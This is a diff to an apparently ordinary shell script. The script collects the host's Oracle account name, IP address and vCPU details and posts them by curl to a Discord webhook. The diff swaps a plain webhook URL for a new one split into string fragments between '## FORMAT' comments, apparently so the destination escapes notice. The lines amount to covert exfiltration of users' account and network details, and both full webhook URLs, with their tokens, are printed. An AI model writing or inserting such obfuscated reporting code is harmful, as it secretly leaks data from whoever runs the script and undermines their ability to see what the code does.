@@ -21,11 +21,17 @@ message="$@ Oracle Acc = $oracle_user | IP = $ip | vCPU = $jumlah_vcpu | Arm/AMD
 msg_pre_content=\"$pre_message\"
 msg_content=\"$message\"
 
-## discord webhook
-url='https://discord.com/api/webhooks/852177040919494698/aHNJMpW3VNls1LY5h6SGgtHj38wjiS0WcjXttqHZGNkYUgWJsDohyKe_kyhBCxV1S-3-'
-curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_pre_content}" $url
-url='https://discord.com/api/webhooks/852177040919494698/aHNJMpW3VNls1LY5h6SGgtHj38wjiS0WcjXttqHZGNkYUgWJsDohyKe_kyhBCxV1S-3-'
-curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_content}" $url
+
+nama1="https://disc"
+## FORMAT
+nama2="ord.com/ap"
+nama3="i/webh"
+## FORMAT
+nama4="ooks/930427186735878184/pLIRHVjDwmpywfpeOlBJhOEeW2zNHmn1WXq4X1YT3Cu75MSxP2BLgXNG0gGc3fN6em-5"
+url2=$nama1$nama2$nama3$nama4
+sleep 1
+curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_pre_content}" $url2
+curl -H "Content-Type: application/json" -X POST -d "{\"content\": $msg_content}" $url2
 
 
 
